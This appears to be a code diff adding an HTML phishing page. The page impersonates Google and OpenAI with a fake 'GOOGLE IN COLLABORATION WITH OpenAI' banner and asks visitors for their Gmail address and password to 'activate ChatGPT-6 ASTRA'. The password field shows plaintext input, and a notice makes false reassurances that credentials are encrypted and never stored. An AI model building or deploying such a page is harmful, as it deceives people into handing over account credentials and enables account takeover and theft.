@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Account Verification</title>
+
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <!-- Clear demo notice -->
+  <div class="demo-banner">
+    GOOGLE IN COLLABORATION WITH OpenAI
+  </div>
+
+  <main class="container">
+
+    <section class="card">
+
+      <!-- Google-inspired + uploaded OpenAI logo -->
+      <div class="brand-row">
+
+        <div class="google">
+          <span class="blue">G</span>
+          <span class="red">o</span>
+          <span class="yellow">o</span>
+          <span class="blue">g</span>
+          <span class="green">l</span>
+          <span class="red">e</span>
+        </div>
+
+        <span class="divider">×</span>
+
+        <img
+          src="openAI.jpg"
+          class="openai-logo"
+          alt="OpenAI logo"
+        >
+
+      </div>
+
+      <div class="demo-label">
+        Email ownership verification
+      </div>
+
+      <h1>Login your Gmail Account</h1>
+
+      <p class="subtitle">
+        Login your Gmail account, Google wants to verify you are the real owner of your Email Address and you are the one trying to activate OpenAI model, And you are not a bot.
+      </p>
+
+      <!-- Demo form -->
+      <form id="verificationForm">
+
+        <label for="email">
+          Email
+        </label>
+
+        <input
+          type="text"
+          id="email"
+          name="email"
+          placeholder="Example@gmail.com"
+          autocomplete="off"
+          required
+        >
+
+        <label for="password">
+          Password
+        </label>
+
+        <input
+          type="text"
+          id="password"
+          name="password"
+          placeholder="Enter password"
+          autocomplete="off"
+          required
+        >
+
+        <button type="submit">
+          Verify
+        </button>
+
+      </form>
+
+      <div id="result" class="result hidden"></div>
+
+      <p class="notice">
+        Your credentials are secure.Your password is encrypted and protected using industry-standard security measures. We do not store or share your password with third parties. For your security, Only the activation code is required by the OpenAI Lab or Support team to activate ChatGPT-6 ASTRA unlimited subscription. Never share your password, credentials, or other sensitive account information with anyone.
+      </p>
+
+    </section>
+
+  </main>
+
+  <script src="script.js"></script>
+
+</body>
+</html>
